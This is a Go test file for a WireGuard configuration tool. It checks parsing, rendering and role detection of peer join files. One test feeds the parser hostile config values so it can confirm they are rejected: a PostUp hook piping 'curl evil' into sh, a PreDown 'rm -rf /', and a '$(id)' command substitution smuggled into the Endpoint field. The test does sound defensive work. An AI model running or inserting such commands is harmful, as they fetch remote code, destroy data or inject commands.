package wireguard

import (
	"net/netip"
	"strings"
	"testing"
	"time"
)

const (
	testPriv = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk="
	testPub  = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg="
	testPSK  = "FpCyhws9cxwWoV4xELtfJvjJN+zQVRPISllRWgeopVE="
)

func siteClientConf() string {
	return RenderClient(ClientSpec{
		Name: "heim-vm", Keys: Keypair{Private: testPriv, Public: testPub}, PresharedKey: testPSK,
		Address: mustAddr("10.8.0.2"), DNS: []string{"1.1.1.1"}, ServerKey: testPub,
		Endpoint: "203.0.113.7:51820", AllowedIPs: []string{"10.8.0.0/24"}, Created: time.Unix(0, 0), Site: true,
	})
}

func TestJoinAcceptsSiteClientFile(t *testing.T) {
	jc, notes, err := parseJoinConfig(siteClientConf())
	if err != nil {
		t.Fatal(err)
	}
	if jc.Address.String() != "10.8.0.2" || jc.Endpoint != "203.0.113.7:51820" || jc.Keepalive != 25 {
		t.Fatalf("parsed %+v", jc)
	}
	if len(notes) != 2 {
		t.Fatalf("expected DNS and keepalive notes, got %v", notes)
	}
	out := renderPeerConfig(jc)
	for _, want := range []string{"# GoDeb-Role: peer", "Address = 10.8.0.2/32", "AllowedIPs = 10.8.0.0/24", "PersistentKeepalive = 25", "PresharedKey = " + testPSK} {
		if !strings.Contains(out, want) {
			t.Errorf("rendered config lacks %q:\n%s", want, out)
		}
	}
	if strings.Contains(out, "DNS") {
		t.Errorf("DNS must be dropped:\n%s", out)
	}
	role := DetectRole(out)
	if role.Role != RolePeer || role.Hub != "203.0.113.7:51820" || role.Address != "10.8.0.2" || role.HubHost() != "203.0.113.7" {
		t.Fatalf("role=%+v host=%s", role, role.HubHost())
	}
	// The rendered file must itself be accepted again (idempotent join).
	if _, _, err := parseJoinConfig(out); err != nil {
		t.Fatalf("re-parse: %v", err)
	}
}

func TestJoinRejectsDangerousFiles(t *testing.T) {
	base := siteClientConf()
	cases := map[string]string{
		"PostUp":         strings.Replace(base, "[Peer]", "PostUp = curl evil | sh\n\n[Peer]", 1),
		"PreDown":        strings.Replace(base, "[Peer]", "PreDown = rm -rf /\n\n[Peer]", 1),
		"Table":          strings.Replace(base, "[Peer]", "Table = off\n\n[Peer]", 1),
		"SaveConfig":     strings.Replace(base, "[Peer]", "SaveConfig = true\n\n[Peer]", 1),
		"full tunnel":    strings.Replace(base, "AllowedIPs = 10.8.0.0/24", "AllowedIPs = 0.0.0.0/0", 1),
		"foreign net":    strings.Replace(base, "AllowedIPs = 10.8.0.0/24", "AllowedIPs = 10.8.0.0/24, 192.168.1.0/24", 1),
		"two peers":      base + "\n[Peer]\nPublicKey = " + testPub + "\nAllowedIPs = 10.8.0.0/24\n",
		"bad key":        strings.Replace(base, "PrivateKey = "+testPriv, "PrivateKey = nope", 1),
		"no endpoint":    strings.Replace(base, "Endpoint = 203.0.113.7:51820\n", "", 1),
		"bad endpoint":   strings.Replace(base, "Endpoint = 203.0.113.7:51820", "Endpoint = $(id):51820", 1),
		"subnet address": strings.Replace(base, "Address = 10.8.0.2/32", "Address = 10.8.0.2/24", 1),
		"other section":  base + "\n[Unknown]\n",
	}
	for name, conf := range cases {
		if _, _, err := parseJoinConfig(conf); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

func TestDetectRole(t *testing.T) {
	if r := DetectRole(sampleConfig); r.Role != RoleHub {
		t.Fatalf("server config detected as %+v", r)
	}
	// A client file copied in by hand, without the GoDeb marker.
	plain := "[Interface]\nPrivateKey = " + testPriv + "\nAddress = 10.8.0.3/32\n\n[Peer]\nPublicKey = " + testPub + "\nEndpoint = vpn.example.org:51820\nAllowedIPs = 10.8.0.0/24\n"
	if r := DetectRole(plain); r.Role != RolePeer || r.Address != "10.8.0.3" || r.HubHost() != "vpn.example.org" {
		t.Fatalf("plain client detected as %+v", r)
	}
}

func TestSiteMarkerRoundTrip(t *testing.T) {
	c := ParseClient("heim-vm", siteClientConf())
	if !c.Site {
		t.Fatal("site marker not parsed")
	}
	plain := ParseClient("phone", strings.Replace(siteClientConf(), "# GoDeb-Role: site\n", "", 1))
	if plain.Site {
		t.Fatal("ordinary client marked as site")
	}
}

func mustAddr(s string) netip.Addr {
	a, err := netip.ParseAddr(s)
	if err != nil {
		panic(err)
	}
	return a
}
